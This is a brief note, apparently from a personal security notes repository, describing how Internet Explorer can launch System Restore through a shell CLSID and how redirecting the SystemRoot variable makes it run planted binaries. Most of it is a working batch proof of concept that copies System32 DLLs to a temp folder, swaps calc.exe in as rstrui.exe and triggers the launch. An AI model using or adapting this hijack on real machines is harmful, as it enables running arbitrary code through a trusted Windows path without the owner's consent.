# RandomCyberStuff

## IE running code
IE navigating to `shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}` you can spawn System restore. If you modify the `SystemRoot` enviroment variable and copy over DLLs you run them.


POC: 
mkdir %temp%\System32
FOR /R C:\Windows\System32\ %F IN (*.dll) DO COPY "%F" %temp%\System32\ /Y >NUL
set a=C:\Windows\System32\calc.exe
copy %a% %temp%\System32\rstrui.exe /Y > NUL
set SystemRoot=%temp%
start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
